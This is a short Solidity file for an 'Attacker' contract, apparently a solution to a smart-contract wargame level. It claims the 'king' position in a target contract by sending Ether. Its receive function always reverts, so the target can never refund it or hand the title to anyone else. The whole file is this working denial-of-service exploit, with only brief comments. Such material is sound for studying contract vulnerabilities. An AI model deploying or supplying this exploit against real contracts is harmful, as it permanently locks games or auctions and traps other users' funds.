// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {
    address payable target;

    constructor(address to) payable {
        target = payable(to);
    }

    function attack() external payable {
        // become the king
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "failed to become king");
    }

    receive() external payable {
        // if someone else tries to become a king
        // they will have to return you your money back,
        // but this will not allow it
        revert("no king for you!");
    }
}
